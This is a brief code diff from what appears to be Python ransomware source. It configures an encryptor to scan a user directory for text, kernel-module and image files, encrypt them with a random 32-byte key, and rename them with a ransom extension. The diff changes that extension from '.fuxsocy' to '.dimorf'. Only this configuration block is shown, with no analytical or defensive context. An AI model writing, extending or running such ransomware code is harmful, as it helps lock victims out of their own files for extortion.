@@ -32,7 +32,7 @@ def check_os(osname: str) -> str | None:
                     path=USER_DIR,
                     ext_files=['.txt', '.ko', '.png', '.jpg'],
                     hidden='.',
-                    new_ext='.fuxsocy',
+                    new_ext='.dimorf',
                     key=Random.get_random_bytes(32),
                     block_bytes=65536
                 )
